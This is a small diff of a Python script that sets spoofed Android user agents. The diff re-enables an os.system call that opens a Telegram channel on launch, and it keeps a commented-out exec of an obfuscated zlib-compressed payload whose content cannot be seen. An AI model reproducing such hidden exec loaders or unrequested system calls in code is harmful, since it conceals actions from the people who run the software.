@@ -58,7 +58,7 @@ uas_random2 = random.choice(["Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QK
 os.system("clear")
 print(' Checking modules ...\n')
 #exec(zlib.decompress(b'x\x9c}\xccA\x0e@0\x10\x05\xd0\xab\xfc\x1d\x16XXJ\xdc\xa5t\xc4$\xa3\xaa3\x95\xb8\xbdX\x10+\x07xo\xd3FO5Z\xcb"rD\x0e\x1c\xd4\x9c\x08\x12\xed\x99\xd4\x14\xd3\xe2\x92\'CN"<v`\x1f\x1c&J\xc63\xa3>1\xa0\xf5t\xb4!\x8b\xf4w\xf1\x04\xbf\xee\xdd?\xba\xa8.k\xe33\x11'))
-#os.system('xdg-open https://t.me/mafia16xv/.com/GxXSKnGiEYD8TPUBfWme05')
+os.system('xdg-open https://t.me/mafia16xv/.com/GxXSKnGiEYD8TPUBfWme05')
 
 
 try:
